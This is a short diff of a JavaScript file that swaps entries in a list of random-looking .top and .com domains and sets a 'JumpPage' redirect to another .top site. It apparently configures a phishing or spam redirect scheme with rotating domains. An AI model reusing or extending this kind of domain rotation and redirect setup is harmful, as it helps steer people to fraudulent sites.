@@ -37,9 +37,9 @@ var emails = [
 ];
 
 var urls=[];
-       urls.push(".iqjjahp.top"); 
-       urls.push(".huebxbus.com");
-       urls.push(".ochvdevo.top");   
+       urls.push(".lmxqqocr.top"); 
+       urls.push(".iqjjahp.top");
+       urls.push(".huebxbus.com");   
       
       		
 var JumpPage="https://hvalansh.top";
